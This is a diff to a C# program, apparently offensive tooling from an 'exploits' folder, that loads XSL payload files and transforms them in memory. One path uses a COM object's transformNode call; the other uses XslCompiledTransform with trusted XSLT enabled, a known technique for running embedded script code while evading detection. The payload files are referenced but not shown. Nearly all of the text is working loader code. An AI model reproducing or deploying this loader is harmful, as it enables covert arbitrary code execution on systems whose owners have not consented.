@@ -12,7 +12,14 @@ namespace COM_XSL_Load_InMem
     {
         static void Main(string[] args)
         {
-            args = new string[] { "file:///exploits/COM-XSL-Load-InMem/payload.xml" };
+            //NATIVE();
+            COM();
+            Console.ReadLine();
+        }
+
+        static void COM()
+        {
+            string[] args = new string[] { "file:///exploits/COM-XSL-Load-InMem/payload.xml" };
 
             //Typed up from The Wover ‏ @TheRealWover 08/06/2019
             //Read script from file 
@@ -39,8 +46,18 @@ namespace COM_XSL_Load_InMem
 
             //Transform XSL
             comType.InvokeMember("transformNode", BindingFlags.Static | BindingFlags.InvokeMethod, null, comObject, new Object[] { comObject });
+        }
 
-            Console.ReadLine();
+        static void NATIVE()
+        {
+            XslCompiledTransform transforma = new XslCompiledTransform();
+            transforma.Load("file:///source/COM-XSL-Load-InMem-DotNet/casey-payload.xslt", XsltSettings.TrustedXslt, new XmlUrlResolver());
+
+            transforma.Transform(
+                XmlReader.Create(new StringReader(new WebClient().DownloadString("file:///source/COM-XSL-Load-InMem-DotNet/casey-xml.xml")), 
+                    new XmlReaderSettings() { Async = true }),
+                XmlWriter.Create(new MemoryStream())
+            );
         }
     }
 }
